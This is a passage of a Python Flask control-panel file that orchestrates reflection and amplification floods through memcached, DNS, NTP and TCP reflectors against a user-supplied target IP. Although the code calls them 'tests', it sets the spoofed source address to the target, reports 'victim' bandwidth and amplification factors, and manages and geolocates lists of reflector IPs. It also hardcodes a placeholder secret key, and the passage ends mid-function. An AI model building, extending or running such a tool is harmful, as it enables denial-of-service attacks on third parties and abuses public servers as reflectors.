#!/usr/bin/env python3
import os
import sys
import time
import socket
import struct
import threading
from threading import Lock, Thread
import json
import psutil
import signal
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict, field
from enum import Enum
import traceback
import subprocess
import re
import ipaddress
import urllib.error
import urllib.request
from pathlib import Path

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_session import Session

try:
    import geoip2.database
    import geoip2.errors
except ImportError:
    geoip2 = None

# 导入测试模块
from attack_resources.memcached.code.tester import MemcachedTester
from attack_resources.dns.code.tester import DNSTester
from attack_resources.ntp.code.tester import NTPTester
from attack_resources.tcp.code.tester import TcpTester
from multi_protocol_test import MultiProtocolTester
from attack_resources.shared.attack_resource_api import attack_resource_bp
from attack_resources.shared.ip_resource_catalog import (
    count_ip_entries,
    list_protocol_resources,
    resolve_protocol_resource_path,
)
from attack_resources.tcp.code.routes import tcp_censor_bp
from attack_resources.dns.code.routes import dns_scan_bp
from attack_resources.memcached.code.routes import memcached_scan_bp
from attack_resources.ntp.code.routes import ntp_scan_bp

# ========= 配置 =========
class TestMethod(Enum):
    MEMCACHED = "memcached"
    DNS = "dns"
    NTP = "ntp"
    TCP = "tcp"
    MULTI = "multi"

class TestStatus(Enum):
    IDLE = "idle"
    RUNNING = "running"
    STOPPING = "stopping"
    COMPLETED = "completed"
    ERROR = "error"

@dataclass
class TestConfig:
    """测试配置"""
    target_ip: str
    target_port: int = 80
    method: str = "single"       # single或multi
    single_method: Optional[TestMethod] = None
    multi_protocols: List[str] = field(default_factory=lambda: ["memcached", "dns", "ntp"])
    duration_minutes: int = 5
    threads: int = 8
    data_size_kb: int = 300
    target_pps: int = 5000
    tcp_pkt_methods: List[str] = field(default_factory=list)
    protocol_sources: Dict[str, List[str]] = field(default_factory=dict)

@dataclass
class TestStats:
    packets_sent: int = 0
    packets_received: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    start_time: float = 0
    end_time: float = 0
    current_pps: float = 0
    current_mbps: float = 0
    status: TestStatus = TestStatus.IDLE
    error_message: str = ""
    progress_percent: float = 0
    victim_mbps: float = 0.0
    max_amplification_factor: float = 0.0
    expected_amplification: float = 0.0
    protocol_details: Dict[str, Any] = field(default_factory=dict)
    selected_protocols: List[str] = field(default_factory=list)

# ========= Flask应用 =========
app = Flask(__name__)
app.secret_key = 'your-secret-key-here-change-in-production'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_USE_SIGNER'] = True
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
Session(app)
app.register_blueprint(tcp_censor_bp)
app.register_blueprint(dns_scan_bp)
app.register_blueprint(memcached_scan_bp)
app.register_blueprint(ntp_scan_bp)
app.register_blueprint(attack_resource_bp)

VALID_SERVER_PROTOCOLS = {'tcp', 'memcached', 'dns', 'ntp'}
GEOIP_CACHE_FILE = os.path.join('config', 'geoip_cache.json')
GEOIP_LOCAL_DB_FILE = os.path.join('attack_resources', 'tcp', 'resources', 'geoip', 'GeoLite2-City.mmdb')
GEOIP_CACHE_TTL_SECONDS = 7 * 24 * 60 * 60
GEOIP_BATCH_SIZE = 100
ATTACK_RESOURCES_ROOT = os.path.join('attack_resources')
SUBDIVISION_COUNTRY_CODES = {'CN', 'US', 'RU', 'CA', 'AU', 'BR', 'IN'}
CHINA_AREA_ALIASES = {
    'HK': ('HK', 'Hong Kong'),
    'HKG': ('HK', 'Hong Kong'),
    'HONG KONG': ('HK', 'Hong Kong'),
    'HONG KONG SAR': ('HK', 'Hong Kong'),
    'MO': ('MO', 'Macao'),
    'MAC': ('MO', 'Macao'),
    'MACAO': ('MO', 'Macao'),
    'MACAU': ('MO', 'Macao'),
    'MACAO SAR': ('MO', 'Macao'),
    'TW': ('TW', 'Taiwan'),
    'TWN': ('TW', 'Taiwan'),
    'TAIWAN': ('TW', 'Taiwan'),
}
COUNTRY_NAME_TO_CODE = {
    'ARGENTINA': 'AR',
    'AUSTRALIA': 'AU',
    'AZERBAIJAN': 'AZ',
    'BANGLADESH': 'BD',
    'BRAZIL': 'BR',
    'CANADA': 'CA',
    'CHINA': 'CN',
    'COLOMBIA': 'CO',
    'CROATIA': 'HR',
    'CZECHIA': 'CZ',
    'ECUADOR': 'EC',
    'FRANCE': 'FR',
    'GERMANY': 'DE',
    'HUNGARY': 'HU',
    'INDIA': 'IN',
    'INDONESIA': 'ID',
    'IRAN': 'IR',
    'JAPAN': 'JP',
    'KENYA': 'KE',
    'LEBANON': 'LB',
    'MALI': 'ML',
    'MEXICO': 'MX',
    'PAKISTAN': 'PK',
    'PERU': 'PE',
    'POLAND': 'PL',
    'PORTUGAL': 'PT',
    'ROMANIA': 'RO',
    'RUSSIA': 'RU',
    'SAUDI ARABIA': 'SA',
    'SINGAPORE': 'SG',
    'SOUTH AFRICA': 'ZA',
    'SOUTH KOREA': 'KR',
    'SPAIN': 'ES',
    'TAJIKISTAN': 'TJ',
    'THAILAND': 'TH',
    'TUNISIA': 'TN',
    'UKRAINE': 'UA',
    'UNITED KINGDOM': 'GB',
    'UNITED STATES': 'US',
    'UNITED STATES OF AMERICA': 'US',
    'VIETNAM': 'VN',
}

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ========= 全局状态 =========
class GlobalState:
    def __init__(self):
        self.current_test = None
        self.test_thread = None
        self.config = None
        self.stats = TestStats()
        self.lock = Lock()
        self.testers = {
            "memcached": MemcachedTester(),
            "dns": DNSTester(),
            "ntp": NTPTester(),
            "tcp": TcpTester()
        }
        self.multi_tester = MultiProtocolTester()
        self.active_tester = None

    def reset(self):
        with self.lock:
            if self.current_test and self.stats.status == TestStatus.RUNNING:
                if self.config and self.config.method == "multi":
                    if self.multi_tester:
                        self.multi_tester.stop_test()
                elif self.active_tester:
                    self.active_tester.stop_test()
                time.sleep(0.5)
            self.current_test = None
            self.test_thread = None
            self.config = None
            self.stats = TestStats()
            self.active_tester = None
            logger.info("系统状态已重置")

    def start_test(self, config: TestConfig):
        with self.lock:
            if self.current_test:
                return False, "测试已在运行中"
            self.config = config
            self.stats = TestStats()
            self.stats.status = TestStatus.RUNNING
            self.stats.start_time = time.time()
            self.stats.end_time = self.stats.start_time + (config.duration_minutes * 60)
            self.stats.selected_protocols = config.multi_protocols if config.method == "multi" else [config.single_method.value]
            self.current_test = config.method
            self.test_thread = Thread(target=self._run_test, daemon=True)
            self.test_thread.start()
            return True, "测试已启动"

    def stop_test(self):
        with self.lock:
            if self.current_test and self.stats.status == TestStatus.RUNNING:
                self.stats.status = TestStatus.STOPPING
                if self.config.method == "multi":
                    if self.multi_tester:
                        self.multi_tester.stop_test()
                else:
                    if self.active_tester and hasattr(self.active_tester, 'stop_test'):
                        self.active_tester.stop_test()
                return True, "正在停止测试..."
            return False, "没有正在运行的测试"

    def get_status(self):
        with self.lock:
            stats_dict = asdict(self.stats)
            stats_dict['status'] = self.stats.status.value
            if self.config:
                config_dict = {
                    'target_ip': self.config.target_ip,
                    'target_port': self.config.target_port,
                    'method': self.config.method,
                    'single_method': self.config.single_method.value if self.config.single_method else None,
                    'multi_protocols': self.config.multi_protocols,
                    'duration_minutes': self.config.duration_minutes,
                    'threads': self.config.threads,
                    'target_pps': self.config.target_pps
                }
                stats_dict['config'] = config_dict
            else:
                stats_dict['config'] = None
            if self.stats.status == TestStatus.RUNNING and self.stats.start_time and self.config:
                elapsed = time.time() - self.stats.start_time
                total = self.config.duration_minutes * 60
                if total > 0:
                    self.stats.progress_percent = min(100, (elapsed / total) * 100)
                    stats_dict['progress_percent'] = self.stats.progress_percent
            return stats_dict

    def _run_test(self):
        try:
            config = self.config
            if config.method == "multi":
                logger.info(f"开始多协议联合测试，协议: {config.multi_protocols}")
                def update_callback(stats):
                    with self.lock:
                        self._update_multi_stats(stats)
                self.multi_tester.run_test(
                    target_ip=config.target_ip,
                    target_port=config.target_port,
                    duration_minutes=config.duration_minutes,
                    total_threads=config.threads,
                    total_target_pps=config.target_pps,
                    protocols=config.multi_protocols,
                    stats_callback=update_callback,
                    protocol_sources=config.protocol_sources
                )
            else:
                if not config.single_method:
                    self._set_error("未指定测试方法")
                    return
                tester = self.testers.get(config.single_method.value)
                if not tester:
                    self._set_error(f"不支持的方法: {config.single_method}")
                    return
                self.active_tester = tester
                def update_callback(stats):
                    with self.lock:
                        self._update_single_stats(stats, config.single_method.value)
                source_files = (config.protocol_sources or {}).get(config.single_method.value, None)
                test_kwargs = dict(
                    target_ip=config.target_ip,
                    target_port=config.target_port,
                    duration_minutes=config.duration_minutes,
                    threads=config.threads,
                    data_size_kb=config.data_size_kb,
                    target_pps=config.target_pps,
                    spoof_source_ip=config.target_ip,
                    spoof_source_port=config.target_port,
                    stats_callback=update_callback,
                )
                if config.single_method.value in ("memcached", "dns", "ntp"):
                    test_kwargs["source_files"] = source_files
                elif config.single_method.value == "tcp":
                    test_kwargs["tcp_pkt_methods"] = config.tcp_pkt_methods
                tester.run_test(**test_kwargs)
            with self.lock:
                if self.stats.status == TestStatus.STOPPING:
                    self.stats.status = TestStatus.COMPLETED
                else:
                    self.stats.status = TestStatus.COMPLETED
        except Exception as e:
            logger.error(f"测试执行错误: {str(e)}\n{traceback.format_exc()}")
            self._set_error(f"测试执行错误: {str(e)}")
        finally:
            with self.lock:
                self.active_tester = None

    def _update_single_stats(self, stats, protocol):
        self.stats.packets_sent = stats.get('packets_sent', 0)
        self.stats.packets_received = stats.get('packets_received', 0)
        self.stats.bytes_sent = stats.get('bytes_sent', 0)
        self.stats.bytes_received = stats.get('bytes_received', 0)
        self.stats.current_pps = stats.get('current_pps', 0)
        self.stats.current_mbps = stats.get('current_mbps', 0)
        if 'victim_mbps' in stats:
            self.stats.victim_mbps = stats['victim_mbps']
        if 'max_amplification_factor' in stats:
            self.stats.max_amplification_factor = stats['max_amplification_factor']
        if 'expected_amplification' in stats:
            self.stats.expected_amplification = stats['expected_amplification']
        if 'progress_percent' in stats:
            self.stats.progress_percent = stats['progress_percent']
        self.stats.protocol_details = {
            protocol: {
                'packets_sent': stats.get('packets_sent', 0),
                'current_pps': stats.get('current_pps', 0),
                'current_mbps': stats.get('current_mbps', 0),
                'amplification_factor': stats.get('max_amplification_factor', 0)
            }
        }

    def _update_multi_stats(self, stats):
        self.stats.packets_sent = stats.get('packets_sent', 0)
        self.stats.bytes_sent = stats.get('bytes_sent', 0)
        self.stats.current_pps = stats.get('current_pps', 0)
        self.stats.current_mbps = stats.get('current_mbps', 0)
        self.stats.victim_mbps = stats.get('victim_mbps', 0.0)
        self.stats.max_amplification_factor = stats.get('max_amplification_factor', 0.0)
        self.stats.progress_percent = stats.get('progress_percent', 0)
        if 'protocol_stats' in stats:
            self.stats.protocol_details = stats['protocol_stats']
        else:
            if not isinstance(self.stats.protocol_details, dict):
                self.stats.protocol_details = {}
        if self.config and self.config.method == "multi":
            for proto in self.config.multi_protocols:
                if proto not in self.stats.protocol_details:
                    self.stats.protocol_details[proto] = {
                        'packets_sent': 0, 'current_pps': 0, 'current_mbps': 0, 'amplification_factor': 0
                    }
        if 'selected_protocols' in stats:
            self.stats.selected_protocols = stats['selected_protocols']
        elif self.config and self.config.method == "multi":
            self.stats.selected_protocols = self.config.multi_protocols

    def _set_error(self, message):
        with self.lock:
            self.stats.status = TestStatus.ERROR
            self.stats.error_message = message

state = GlobalState()

def is_valid_server_method(method: str) -> bool:
    return method in VALID_SERVER_PROTOCOLS

def get_server_file(method: str) -> str:
    return os.path.join(ATTACK_RESOURCES_ROOT, method, 'resources', 'ip_lists', 'default.txt')

def get_default_server_file_content(method: str) -> str:
    return '# ???????????IP?????n'

def list_server_sources(method: str) -> List[Dict[str, Any]]:
    resources = list_protocol_resources(method, ATTACK_RESOURCES_ROOT)
    return [
        {
            'id': item['id'],
            'name': item['filename'],
            'display_name': item['display_name'],
            'path': item['path'],
            'full_path': item['full_path'],
            'entry_count': item['entry_count'],
            'editable': True,
            'location_label': item.get('location_label'),
            'protocols': item.get('protocols', []),
            'source': item.get('source'),
            'source_name': item.get('source_name'),
            'type': item.get('type'),
            'updated_at': item.get('updated_at'),
            'legacy': item.get('legacy', False),
            'sub_dir': item.get('sub_dir', ''),
        }
        for item in resources
    ]

def list_server_source_paths(method: str) -> List[Path]:
    return [Path(item['full_path']) for item in list_server_sources(method)]

def count_server_entries_in_file(path: Path) -> int:
    return count_ip_entries(path)

def resolve_server_source(method: str, source: Optional[str] = None) -> Optional[Path]:
    resources = list_server_sources(method)
    if not resources:
        return None
    if source:
        resolved = resolve_protocol_resource_path(method, source, ATTACK_RESOURCES_ROOT)
        if resolved is not None:
            return resolved
        source_name = Path(str(source)).name
        for item in resources:
            if item['name'] == source_name:
                return Path(item['full_path'])
        return None
    return Path(resources[0]['full_path'])

def resolve_server_sources(method: str, sources: Optional[List[str]] = None) -> List[Path]:
    resources = list_server_sources(method)
    if not resources:
        return []
    if not sources:
        return [Path(item['full_path']) for item in resources]

    resolved: List[Path] = []
    seen = set()
    for source in sources:
        path = resolve_server_source(method, source)
        if path is None:
            continue
        if path not in seen:
            seen.add(path)
            resolved.append(path)
    return resolved or [Path(item['full_path']) for item in resources]

def get_effective_server_file(method: str, source: Optional[str] = None) -> str:
    resolved = resolve_server_source(method, source)
    if resolved is not None:
        return str(resolved)
    return get_server_file(method)

def read_server_entries_from_file(path: Path) -> List[str]:
    if not path.exists():
        return []
    servers = []
    with path.open('r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                servers.append(line)
    return servers

def read_server_entries(method: str, source_files: Optional[List[Path]] = None) -> List[str]:
    source_paths = source_files if source_files is not None else resolve_server_sources(method)
    servers = []
    seen = set()
    for path in source_paths:
        for server in read_server_entries_from_file(path):
            if server not in seen:
                seen.add(server)
                servers.append(server)
    return servers

def load_geoip_cache() -> Dict[str, Any]:
    if not os.path.exists(GEOIP_CACHE_FILE):
        return {}
    try:
        with open(GEOIP_CACHE_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (OSError, json.JSONDecodeError):
        logger.warning("GeoIP cache could not be loaded", exc_info=True)
        return {}

def save_geoip_cache(cache: Dict[str, Any]) -> None:
    os.makedirs(os.path.dirname(GEOIP_CACHE_FILE), exist_ok=True)
    tmp_file = f'{GEOIP_CACHE_FILE}.tmp'
    with open(tmp_file, 'w', encoding='utf-8') as f:
        json.dump(cache, f, ensure_ascii=False, indent=2)
    os.replace(tmp_file, GEOIP_CACHE_FILE)

def resolve_public_ip(entry: str) -> Tuple[Optional[str], Optional[str]]:
    target = entry.strip()
    if not target:
        return None, 'empty'
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        return None, 'dns_failed'
    try:
        parsed = ipaddress.ip_address(ip)
    except ValueError:
        return None, 'invalid_ip'
    if not parsed.is_global:
        return None, 'private_or_reserved'
    return ip, None

def normalize_geo_record(geo: Dict[str, Any]) -> Dict[str, Any]:
    normalized = dict(geo)
    country = (normalized.get('country') or '').strip()
    country_code = (normalized.get('country_code') or normalized.get('countryCode') or '').strip().upper()
    region = (normalized.get('region') or normalized.get('regionName') or '').strip()
    region_code = (normalized.get('region_code') or normalized.get('regionCode') or '').strip().upper()
    if not country_code and country:
        country_code = COUNTRY_NAME_TO_CODE.get(country.upper(), '')

    china_alias = None
    for value in (country_code, country, region_code, region):
        key = str(value or '').strip().upper()
        if key in CHINA_AREA_ALIASES:
            china_alias = CHINA_AREA_ALIASES[key]
            break

    if china_alias:
        country = 'China'
        country_code = 'CN'
        region_code = region_code or china_alias[0]
        region = region or china_alias[1]

    normalized['country'] = country
    normalized['country_code'] = country_code
    normalized['region'] = region
    normalized['region_code'] = region_code
    normalized.pop('countryCode', None)
    normalized.pop('regionName', None)
    normalized.pop('regionCode', None)
    return normalized

def is_geo_cache_complete(cached: Dict[str, Any]) -> bool:
    normalized = normalize_geo_record(cached)
    if normalized.get('lat') is None or normalized.get('lon') is None:
        return False
    if not normalized.get('country') or not normalized.get('country_code'):
        return False
    if normalized.get('country_code') in SUBDIVISION_COUNTRY_CODES:
        return bool(normalized.get('region') or normalized.get('region_code'))
    return True

def query_geoip_local_batch(ips: List[str]) -> Dict[str, Dict[str, Any]]:
    if not ips or geoip2 is None or not os.path.exists(GEOIP_LOCAL_DB_FILE):
        return {}
    located = {}
    try:
        reader = geoip2.database.Reader(GEOIP_LOCAL_DB_FILE)
    except (OSError, ValueError) as exc:
        logger.warning("Local GeoIP database could not be opened: %s", exc)
        return {}
    try:
        for ip in ips:
            try:
                result = reader.city(ip)
            except (geoip2.errors.AddressNotFoundError, ValueError):
                continue
            region = result.subdivisions.most_specific
            geo = normalize_geo_record({
                'ip': ip,
                'lat': result.location.latitude,
                'lon': result.location.longitude,
                'country': result.country.name or '',
                'country_code': result.country.iso_code or '',
                'region': region.name or '',
                'region_code': region.iso_code or '',
                'city': result.city.name or '',
                'isp': '',
                'cached_at': time.time()
            })
            if geo.get('lat') is not None and geo.get('lon') is not None:
                located[ip] = geo
    finally:
        reader.close()
    return located

def query_geoip_batch(ips: List[str]) -> Dict[str, Dict[str, Any]]:
    if not ips:
        return {}
    url = 'http://ip-api.com/batch?fields=status,message,query,lat,lon,country,countryCode,region,regionName,city,isp'
    payload = json.dumps(ips).encode('utf-8')
    request_obj = urllib.request.Request(
        url,
        data=payload,
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    with urllib.request.urlopen(request_obj, timeout=8) as response:
        body = response.read().decode('utf-8')
    results = json.loads(body)
    if not isinstance(results, list):
        raise ValueError('GeoIP API returned an unexpected response')
    located = {}
    for item in results:
        if not isinstance(item, dict):
            continue
        ip = item.get('query')
        if item.get('status') == 'success' and ip and item.get('lat') is not None and item.get('lon') is not None:
            located[ip] = normalize_geo_record({
                'ip': ip,
                'lat': float(item.get('lat')),
                'lon': float(item.get('lon')),
                'country': item.get('country') or '',
                'country_code': item.get('countryCode') or '',
                'region': item.get('regionName') or '',
                'region_code': item.get('region') or '',
                'city': item.get('city') or '',
                'isp': item.get('isp') or '',
                'cached_at': time.time()
            })
    return located

def build_geo_areas(points: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    area_map: Dict[str, Dict[str, Any]] = {}
    for point in points:
        geo = normalize_geo_record(point)
        country_code = geo.get('country_code') or ''
        country = geo.get('country') or 'Unknown'
        region_code = geo.get('region_code') or ''
        region = geo.get('region') or ''
        entries = geo.get('entries') if isinstance(geo.get('entries'), list) else []

        if country_code in SUBDIVISION_COUNTRY_CODES and (region_code or region):
            level = 'region'
            area_code = f"{country_code}-{region_code}" if region_code else f"{country_code}:{region.lower()}"
            area_name = region or area_code
        else:
            level = 'country'
            area_code = country_code or country.lower()
            area_name = country

        key = f"{level}:{area_code}"
        area = area_map.setdefault(key, {
            'level': level,
            'area_code': area_code,
            'name': area_name,
            'country_code': country_code,
            'country': country,
            'region_code': region_code if level == 'region' else '',
            'region': region if level == 'region' else '',
            'resource_count': 0,
            'ips': [],
            'entries': []
        })
        area['resource_count'] += 1
        if geo.get('ip') and geo.get('ip') not in area['ips']:
            area['ips'].append(geo.get('ip'))
        for entry in entries:
            if entry not in area['entries']:
                area['entries'].append(entry)

    return sorted(
        area_map.values(),
        key=lambda item: (-int(item.get('resource_count') or 0), item.get('country') or '', item.get('region') or '')
    )

def build_geo_points(method: str, source_files: Optional[List[Path]] = None) -> Dict[str, Any]:
    entries = read_server_entries(method, source_files=source_files)
    cache = load_geoip_cache()
    now = time.time()
    unresolved = []
    ip_entries: Dict[str, List[str]] = {}

    for entry in entries:
        ip, reason = resolve_public_ip(entry)
        if not ip:
            unresolved.append({'entry': entry, 'reason': reason})
            continue
        ip_entries.setdefault(ip, []).append(entry)

    points_by_ip = {}
    stale_points = {}
    missing_ips = []
    for ip in ip_entries:
        cached = cache.get(ip)
        if isinstance(cached, dict) and is_geo_cache_complete(cached):
            cached = normalize_geo_record(cached)
            if now - float(cached.get('cached_at', 0)) <= GEOIP_CACHE_TTL_SECONDS:
                points_by_ip[ip] = cached
            else:
                stale_points[ip] = cached
                missing_ips.append(ip)
        else:
            if isinstance(cached, dict) and cached.get('lat') is not None and cached.get('lon') is not None:
                stale_points[ip] = normalize_geo_record(cached)
            missing_ips.append(ip)

    api_failed = False
    for index in range(0, len(missing_ips), GEOIP_BATCH_SIZE):
        batch = missing_ips[index:index + GEOIP_BATCH_SIZE]
        located = query_geoip_local_batch(batch)
        api_lookup_failed = False
        unresolved_batch = [ip for ip in batch if ip not in located]
        if unresolved_batch:
            try:
                located.update(query_geoip_batch(unresolved_batch))
            except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
                api_failed = True
                api_lookup_failed = True
                logger.warning("GeoIP lookup failed: %s", exc)
        try:
            for ip, geo in located.items():
                cache[ip] = geo
                points_by_ip[ip] = geo
                stale_points.pop(ip, None)
            for ip in batch:
                if ip not in located and ip not in stale_points:
                    unresolved.append({'entry': ip_entries[ip][0], 'ip': ip, 'reason': 'geo_api_failed' if api_lookup_failed else 'geo_not_found'})
            for ip in batch:
                if ip in stale_points:
                    points_by_ip[ip] = stale_points[ip]
        except (OSError, ValueError) as exc:
            api_failed = True
            logger.warning("GeoIP processing failed: %s", exc)
            for ip in batch:
                if ip in stale_points:
                    points_by_ip[ip] = stale_points[ip]
                else:
                    unresolved.append({'entry': ip_entries[ip][0], 'ip': ip, 'reason': 'geo_api_failed'})

    if missing_ips:
        try:
            save_geoip_cache(cache)
        except OSError:
            logger.warning("GeoIP cache could not be saved", exc_info=True)

    points = []
    for ip, geo in points_by_ip.items():
        geo = normalize_geo_record(geo)
        points.append({
            'ip': ip,
            'entries': ip_entries.get(ip, [ip]),
            'lat': geo.get('lat'),
            'lon': geo.get('lon'),
            'country': geo.get('country') or '',
            'country_code': geo.get('country_code') or '',
            'region': geo.get('region') or '',
            'region_code': geo.get('region_code') or '',
            'city': geo.get('city') or '',
            'isp': geo.get('isp') or '',
            'stale': ip in stale_points
        })
    areas = build_geo_areas(points)

    return {
        'success': True,
        'protocol': method,
        'total': len(entries),
        'located_count': len(points),
        'unresolved_count': len(unresolved),
        'area_count': len(areas),
        'areas': areas,
        'points': points,
        'unresolved': unresolved,
        'geo_api_degraded': api_failed
    }

# ========= 路由 =========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/config', methods=['GET'])
def get_config():
    status = state.get_status()
    status['is_data_fresh'] = status.get('victim_mbps', 0) > 0
    if 'expected_amplification' not in status or status['expected_amplification'] == 0:
        if state.config:
            if state.config.method == "multi":
                status['expected_amplification'] = 556
            elif state.config.single_method:
                method = state.config.single_method.value
                amp_map = {'memcached': 50, 'dns': 54, 'ntp': 556, 'tcp': 'Dynamic'}
                status['expected_amplification'] = amp_map.get(method, 10)
        else:
            status['expected_amplification'] = 10
    return jsonify(status)

@app.route('/api/test/start', methods=['POST'])
def start_test():
    if state.current_test:
        return jsonify({'success': False, 'message': '测试已在运行中'})
    try:
        data = request.json
        if not data.get('target_ip'):
            return jsonify({'success': False, 'message': '请输入目标IP'})
        multi_protocol = data.get('multi_protocol', False)
        selected_protocols = data.get('selected_protocols', [])
        protocol_sources = data.get('protocol_sources', {})
        if multi_protocol:
            if not selected_protocols:
                return jsonify({'success': False, 'message': '请至少选择一个协议'})
            valid_protocols = ["memcached", "dns", "ntp", "tcp"]
            for protocol in selected_protocols:
                if protocol not in valid_protocols:
                    return jsonify({'success': False, 'message': f'无效的协议: {protocol}'})
            config = TestConfig(
                target_ip=data['target_ip'],
                target_port=int(data.get('target_port', 80)),
                method="multi",
                multi_protocols=selected_protocols,
                duration_minutes=int(data.get('duration', 5)),
                threads=int(data.get('threads', 8)),
                data_size_kb=int(data.get('data_size_kb', 300)),
                target_pps=int(data.get('target_pps', 5000)),
                tcp_pkt_methods=data.get('tcp_pkt_methods', []),
                protocol_sources=protocol_sources
            )
        else:
            if not data.get('method'):
                return jsonify({'success': False, 'message': '请选择测试方法'})
            try:
                single_method = TestMethod(data['method'])
            except ValueError:
                return jsonify({'success': False, 'message': '不支持的测试方法'})
            config = TestConfig(
                target_ip=data['target_ip'],
                target_port=int(data.get('target_port', 80)),
                method="single",
                single_method=single_method,
                multi_protocols=[data['method']],
                duration_minutes=int(data.get('duration', 5)),
                threads=int(data.get('threads', 8)),
                data_size_kb=int(data.get('data_size_kb', 300)),
                target_pps=int(data.get('target_pps', 5000)),
                tcp_pkt_methods=data.get('tcp_pkt_methods', []),
                protocol_sources=data.get('protocol_sources', {})
            )
        success, message = state.start_test(config)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"启动测试错误: {str(e)}")
        return jsonify({'success': False, 'message': f'启动失败: {str(e)}'})

@app.route('/api/test/stop', methods=['POST'])
def stop_test():
    success, message = state.stop_test()
    return jsonify({'success': success, 'message': message})

@app.route('/api/test/reset', methods=['POST'])
def reset_test():
    state.reset()
    return jsonify({'success': True, 'message': '已重置'})

@app.route('/api/servers/<method>', methods=['GET'])
def get_servers(method):
    try:
        if not is_valid_server_method(method):
            return jsonify({'success': False, 'message': '不支持的方法'})
        source_files = resolve_server_sources(method, request.args.getlist('files'))
        servers = read_server_entries(method, source_files=source_files)
        if not servers:
            defaults = {
                'memcached': ['127.0.0.1'],
                'dns': ['8.8.8.8', '1.1.1.1', '9.9.9.9'],
                'ntp': ['pool.ntp.org', 'time.google.com'],
                'tcp': []
            }
            servers = defaults.get(method, [])
        return jsonify({'success': True, 'servers': servers, 'count': len(servers)})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/<method>/list', methods=['GET'])
def get_server_list(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    source_files = resolve_server_sources(method, request.args.getlist('files'))
    servers = read_server_entries(method, source_files=source_files)
    return jsonify({'success': True, 'servers': servers})

@app.route('/api/servers/<method>/files', methods=['GET'])
def get_server_sources(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': 'Unsupported method'})
    return jsonify({'success': True, 'files': list_server_sources(method)})

@app.route('/api/servers/<method>/file', methods=['GET'])
def get_server_file_content(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': 'Unsupported method'})
    source = request.args.get('source', '').strip()
    source_path = resolve_server_source(method, source or None)
    if source and source_path is None:
        return jsonify({'success': False, 'message': 'Source file not found'}), 404
    if source_path is None:
        return jsonify({'success': False, 'message': 'Source file not found'}), 404
    filename = str(source_path)
    content = get_default_server_file_content(method)
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
    return jsonify({
        'success': True,
        'file': {
            'name': os.path.basename(filename),
            'path': filename,
            'source': os.path.basename(filename),
            'type': 'text',
            'editable': True,
            'content': content
        }
    })

@app.route('/api/servers/<method>/file', methods=['POST'])
def create_server_file(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': 'Unsupported method'})
    data = request.json or {}
    filename = data.get('filename', '').strip()
    if not filename:
        return jsonify({'success': False, 'message': '请输入文件名'})
    if not filename.endswith('.txt'):
        filename = filename + '.txt'
    # 校验文件名：只允许字母、数字、下划线、横线和 .txt
    if not re.match(r'^[a-zA-Z0-9_\-]+\.txt$', filename):
        return jsonify({'success': False, 'message': '文件名只允许英文字母、数字、下划线和横线'})
    ip_lists_dir = Path(ATTACK_RESOURCES_ROOT) / method / 'resources' / 'ip_lists'
    ip_lists_dir.mkdir(parents=True, exist_ok=True)
    file_path = ip_lists_dir / filename
    if file_path.exists():
        return jsonify({'success': False, 'message': f'文件 {filename} 已存在'})
    try:
        file_path.write_text('# 每行一个反射器IP或域名\n', encoding='utf-8')
        logger.info(f"已创建源文件: {file_path}")
        return jsonify({
            'success': True,
            'message': f'文件 {filename} 已创建',
            'file': {
                'name': filename,
                'path': str(file_path),
                'entry_count': 0,
                'editable': True,
            }
        })
    except Exception as e:
        logger.error(f"创建文件失败: {e}")
        return jsonify({'success': False, 'message': f'创建文件失败: {str(e)}'})

@app.route('/api/servers/<method>/geo', methods=['GET'])
def get_server_geo(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    try:
        source_files = resolve_server_sources(method, request.args.getlist('files'))
        return jsonify(build_geo_points(method, source_files=source_files))
    except Exception as e:
        logger.error("GeoIP endpoint failed: %s", e, exc_info=True)
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/<method>/file', methods=['PUT'])
def update_server_file_content(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': 'Unsupported method'})
    data = request.json or {}
    content = data.get('content', '')
    if not isinstance(content, str):
        return jsonify({'success': False, 'message': 'File content must be a string'})
    source = request.args.get('source', '').strip()
    source_path = resolve_server_source(method, source or None)
    if source and source_path is None:
        return jsonify({'success': False, 'message': 'Source file not found'}), 404
    if source_path is None:
        return jsonify({'success': False, 'message': 'Source file not found'}), 404
    filename = str(source_path)
    normalized = content.replace('\r\n', '\n')
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'w', encoding='utf-8', newline='\n') as f:
            f.write(normalized)
        valid_count = len([
            line for line in normalized.split('\n')
            if line.strip() and not line.strip().startswith('#')
        ])
        return jsonify({'success': True, 'message': f'Saved {valid_count} active entries'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/<method>/update', methods=['POST'])
def update_server_list(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    data = request.json
    servers = data.get('servers', [])
